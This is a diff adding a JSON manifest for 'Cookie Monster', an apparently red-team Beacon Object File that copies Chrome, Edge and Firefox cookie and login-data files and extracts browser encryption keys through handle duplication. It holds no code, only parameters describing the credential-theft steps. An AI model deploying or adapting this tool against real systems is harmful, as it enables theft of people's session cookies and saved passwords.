@@ -1,0 +1,123 @@
+{
+  "name": "Cookie Monster",
+  "version": "v0.0.0",
+  "command_name": "cookie-monster",
+  "extension_author": "",
+  "original_author": "",
+  "repo_url": "",
+  "help": "Beacon Object File (BOF) that locates and copies browser cookie and login data files for Edge, Chrome, and Firefox. Extracts WebKit Master Key and App Bound Encryption Key, uses fileless retrieval via handle duplication, and supports decryption without injecting into the browser (e.g. --system mode).",
+  "depends_on": "coff-loader",
+  "entrypoint": "go",
+  "files": [
+    {
+      "os": "windows",
+      "arch": "amd64",
+      "path": "cookie-monster-bof.x64.o"
+    },
+    {
+      "os": "windows",
+      "arch": "x86",
+      "path": "cookie-monster-bof.x86.o"
+    }
+  ],
+  "arguments": [
+    {
+      "name": "chrome",
+      "desc": "Target Chrome; find process with handle to cookies and copy file to CWD (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "edge",
+      "desc": "Target Edge; find process with handle to cookies and copy file to CWD (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "system",
+      "desc": "Decrypt app bound encryption key without injecting into browser (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "firefox",
+      "desc": "Target Firefox; find profiles.ini and locate key4.db and logins.json (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "chromeCookiePID",
+      "desc": "Chrome PID with handle to cookies; duplicate handle and copy file (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "chromeLoginDataPID",
+      "desc": "Chrome PID with handle to Login Data; duplicate handle and copy file (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "edgeCookiePID",
+      "desc": "Edge PID with handle to cookies; duplicate handle and copy file (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "edgeLoginDataPID",
+      "desc": "Edge PID with handle to Login Data; duplicate handle and copy file (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "pid",
+      "desc": "PID of process (for --system or --*CookiePID/--*LoginDataPID options)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "path",
+      "desc": "Path to Local State file (required when using --system)",
+      "type": "string",
+      "optional": false,
+      "default": ""
+    },
+    {
+      "name": "keyOnly",
+      "desc": "Only retrieve the app bound encryption key; do not download Cookie or Login Data files (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "cookieOnly",
+      "desc": "Only retrieve the Cookie file; do not download Login Data or retrieve encryption key (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "loginDataOnly",
+      "desc": "Only retrieve the Login Data file; do not download Cookie file or retrieve encryption key (0 or 1)",
+      "type": "int",
+      "optional": false,
+      "default": 0
+    },
+    {
+      "name": "copyFile",
+      "desc": "Copy Cookie and Login Data to the specified folder (no fileless retrieval)",
+      "type": "string",
+      "optional": false,
+      "default": ""
+    }
+  ]
+}
